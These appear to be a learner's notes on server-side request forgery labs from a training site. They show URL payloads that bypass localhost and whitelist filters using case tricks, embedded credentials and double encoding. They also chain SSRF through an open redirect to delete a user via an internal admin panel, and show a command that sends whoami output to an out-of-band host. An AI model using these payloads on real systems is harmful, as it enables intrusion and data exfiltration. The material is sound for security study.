
http://localhost/admin/delete?username=carlos
http://LocaLhOst/adMin/delete?username=carlos
http://127.1/adMin/delete?username=carlos


EXPERT: SSRF with whitelist-based input filter:
--------------------------------------------------

stockApi=http://localhost@stock.weliketoshop.net:8080 
	response:
		HTTP/2 400 Bad Request
		"Missing parameter"

this indicating that the URL parser supports embedded credentials, so let's play with it!


stockApi=http://localhost#@stock.weliketoshop.net:8080

response:
	HTTP/2 400 Bad Request
	"External stock check host must be stock.weliketoshop.net"


stockApi=http://localhost%23@stock.weliketoshop.net:8080    ==> same response
stockApi=http://localhost%2523@stock.weliketoshop.net:8080  ==> boom there we go, double encodig sometimes works!

stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin  ==> admin panel
stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos   ==> Done!



-----------------------------------------------------------------------------------------------------------------------------------




PRACTITIONER: SSRF with filter bypass via open redirection vulnerability:
------------------------------------------------------------------------------

GET /product/nextProduct?path=https://www.google.com
from this request we redirected to the google.com so here is an open redirect vulnarability in the path parameter on this location on the server, so...


we grab that location and submit it on the POST request that we know that contains stockApi parameter that vulnarable to SSRF vulnarability

POST /product/stock HTTP/2
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos










EXPERT: Blind SSRF with Shellshock exploitation:
----------------------------------------------------

┌──(yousseff㉿yousseff)-[~]
└─$ nslookup $(whoami).fgzq0q6n88k5gki5p8k136jd74du1j.oastify.com


peter-0M9J9g